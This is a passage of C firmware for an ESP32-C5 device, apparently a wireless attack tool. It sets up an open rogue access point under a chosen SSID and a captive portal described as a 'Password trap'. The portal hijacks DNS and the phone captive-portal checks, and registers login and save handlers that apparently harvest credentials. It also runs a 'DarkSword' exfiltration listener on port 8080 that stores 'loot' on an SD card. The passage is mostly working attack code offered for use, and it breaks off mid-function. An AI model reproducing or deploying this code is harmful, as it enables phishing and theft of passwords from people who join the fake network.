Smethan/projectZero/ESP32C5/main/main.c
    // RFC 8908 captive portal API
    const httpd_uri_t api_uri = {
        .uri = "/captive-portal/api", .method = HTTP_GET, .handler = captive_api_handler
    };
    httpd_register_uri_handler(portal_server, &api_uri);

    darksword_active = true;
    portal_active = true;

    // DNS server
    BaseType_t dns_ret = xTaskCreate(dns_server_task, "dns_server", 4096, NULL, 5,
                                     &dns_server_task_handle);
    if (dns_ret != pdPASS) {
        darksword_active = false;
        portal_active = false;
        httpd_stop(portal_server);
        portal_server = NULL;
        return 1;
    }

    // Exfil listener on port 8080
    BaseType_t exfil_ret = xTaskCreate(darksword_exfil_task, "ds_exfil", 8192, NULL, 5,
                                       &darksword_exfil_task_handle);
    if (exfil_ret != pdPASS) {
        MY_LOG_INFO(TAG, "DS: exfil task creation failed — port 80 /stats still available");
    }

    led_set_color(255, 0, 0); // Red for DarkSword

    MY_LOG_INFO(TAG, "DarkSword portal active!");
    MY_LOG_INFO(TAG, "  AP: %s  IP: 172.0.0.1", ssid);
    MY_LOG_INFO(TAG, "  HTTP :80   Exfil :8080");
    MY_LOG_INFO(TAG, "  Loot: /sdcard/loot/portal/");
    return 0;
}

// Start portal command
static int cmd_start_portal(int argc, char **argv) {
    oled_display_update_full("> Captive Portal",
        argc >= 2 ? argv[1] : "  No SSID",
        "  Password trap", "  Waiting...");
    log_memory_info("start_portal");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Check for SSID argument
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: start_portal <SSID>");
        MY_LOG_INFO(TAG, "Example: start_portal MyWiFi");
        return 1;
    }
    
    // Check if portal is already running
    if (portal_active) {
        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
        return 0;
    }
    
    // Concatenate all arguments to support SSIDs with spaces
    // e.g. start_portal Darmowy Internet → "Darmowy Internet"
    static char ssid_buf[33]; // 32 chars max + NUL
    ssid_buf[0] = '\0';
    for (int i = 1; i < argc; i++) {
        if (i > 1) strncat(ssid_buf, " ", sizeof(ssid_buf) - strlen(ssid_buf) - 1);
        strncat(ssid_buf, argv[i], sizeof(ssid_buf) - strlen(ssid_buf) - 1);
    }
    const char *ssid = ssid_buf;
    size_t ssid_len = strlen(ssid);

    // Validate SSID length (WiFi SSID max is 32 characters)
    if (ssid_len == 0 || ssid_len > 32) {
        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
        return 1;
    }
    
    // Store portal SSID for logging purposes
    if (portalSSID != NULL) {
        free(portalSSID);
    }
    portalSSID = malloc(ssid_len + 1);
    if (portalSSID != NULL) {
        strcpy(portalSSID, ssid);
    }
    
    MY_LOG_INFO(TAG, "Starting captive portal with SSID: %s", ssid);
    
    // Enable AP mode and get AP netif
    esp_netif_t *ap_netif = ensure_ap_mode();
    if (!ap_netif) {
        MY_LOG_INFO(TAG, "Failed to enable AP mode");
        return 1;
    }
    
    // Stop DHCP server to configure custom IP
    esp_netif_dhcps_stop(ap_netif);
    
    // Set static IP 172.0.0.1 for AP
    esp_netif_ip_info_t ip_info;
    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
    
    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
    if (ret != ESP_OK) {
        return 1;
    }
    
    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
    
    // Configure AP with provided SSID
    wifi_config_t ap_config = {0};
    memcpy(ap_config.ap.ssid, ssid, ssid_len);
    ap_config.ap.ssid_len = ssid_len;
    ap_config.ap.channel = 1;
    ap_config.ap.password[0] = '\0';
    ap_config.ap.max_connection = 4;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    
    // AP mode already enabled by ensure_ap_mode(), just configure it
    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if (ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
        return 1;
    }
    
    // Start DHCP server
    ret = esp_netif_dhcps_start(ap_netif);
    if (ret != ESP_OK) {
        esp_wifi_stop();
        return 1;
    }
    
    // Wait a bit for AP to fully start
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    // Configure HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = 80;
    config.max_open_sockets = 7;
    config.uri_match_fn = httpd_uri_match_wildcard;

    // Start HTTP server
    esp_err_t http_ret = httpd_start(&portal_server, &config);
    if (http_ret != ESP_OK) {
        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
        esp_wifi_stop();
        return 1;
    }
    
    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
    
    // Register URI handlers
    // Root path handler - most devices try this first
    httpd_uri_t root_uri = {
        .uri = "/",
        .method = HTTP_GET,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_uri);
    
    // Root path handler for POST requests
    httpd_uri_t root_post_uri = {
        .uri = "/",
        .method = HTTP_POST,
        .handler = root_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &root_post_uri);
    
    // Portal page handler
    httpd_uri_t portal_uri = {
        .uri = "/portal",
        .method = HTTP_GET,
        .handler = portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &portal_uri);
    
    // Login handler
    httpd_uri_t login_uri = {
        .uri = "/login",
        .method = HTTP_POST,
        .handler = login_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &login_uri);
    
    // GET handler
    httpd_uri_t get_uri = {
        .uri = "/get",
        .method = HTTP_GET,
        .handler = get_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &get_uri);
    
    // Save handler
    httpd_uri_t save_uri = {
        .uri = "/save",
        .method = HTTP_POST,
        .handler = save_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &save_uri);
    
    // Android captive portal detection
    httpd_uri_t android_captive_uri = {
        .uri = "/generate_204",
        .method = HTTP_GET,
        .handler = android_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &android_captive_uri);
    
    // iOS captive portal detection
    httpd_uri_t ios_captive_uri = {
        .uri = "/hotspot-detect.html",
        .method = HTTP_GET,
        .handler = ios_captive_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &ios_captive_uri);
    
    // Samsung captive portal detection
    httpd_uri_t samsung_captive_uri = {
        .uri = "/ncsi.txt",
        .method = HTTP_GET,
        .handler = captive_detection_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
    
    // Catch-all handler for other requests
    httpd_uri_t captive_uri = {
        .uri = "/*",
        .method = HTTP_GET,
        .handler = captive_portal_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_uri);
    
    // Register RFC 8908 Captive Portal API endpoint
    httpd_uri_t captive_api_uri = {
        .uri = "/captive-portal/api",
        .method = HTTP_GET,
        .handler = captive_api_handler,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(portal_server, &captive_api_uri);
    
